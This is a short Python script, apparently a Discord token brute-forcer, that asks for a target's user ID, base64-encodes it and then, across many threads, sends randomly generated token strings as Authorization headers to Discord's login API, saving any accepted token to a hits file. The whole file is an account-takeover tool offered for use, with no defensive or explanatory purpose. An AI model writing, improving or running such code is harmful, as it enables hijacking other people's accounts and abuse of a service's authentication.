import base64
import threading
import random
import string
import requests
import time
import os
import colorama
from colorama import Fore
colorama.init()
os.system('cls')

print(f"{Fore.RED}                            ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ██████╗ ███████╗")
print(f"{Fore.RED}                            ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔══██╗██╔════╝       ")
print(f"{Fore.RED}                               ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██████╔╝█████╗         ")
print(f"{Fore.RED}                               ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝         ")
print(f"{Fore.RED}                               ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ██████╔╝██║            ")
print(f"{Fore.RED}                               ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚═════╝ ╚═╝            ")
print(f"{Fore.RED}                                  Please note that the bruteforce WILL take a while                ")
print(f"{Fore.RED}                                  if you are lucky enough the bruteforce will stop                 ")
print(f"{Fore.RED}                                    and say something like this: Valid: token123                   ")
print(f"                                                                                                             ")                                                                                                   
print(f"                                                                                                             ")     
print(f"                                                                                                             ")     

idtoken = base64.b64encode((input(f"{Fore.YELLOW}[!] {Fore.WHITE}Paste userID: ")).encode("ascii"))
idtoken = str(idtoken)[2:-1]
thrd =  input(f"{Fore.YELLOW}[!]{ Fore.WHITE}Threads: ")


def bruhmoment():
    while idtoken == idtoken:
        token = idtoken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        header={
            'Authorization': token
        }
        bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

        if bruh.status_code == 200:
                print(F"{Fore.YELLOW}[!] {Fore.GREEN}VALID" + ' ' + token)
                print(" ")
                file = open('brutehits.txt', "a+")
                file.write(F'{token}\n')
        else:
                print(F"{Fore.YELLOW}[!] {Fore.WHITE}INVALID" + ' ' + token)
                print(" ")

threads = []

for _ in range(int(thrd)):
    t = threading.Thread(target=bruhmoment)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()
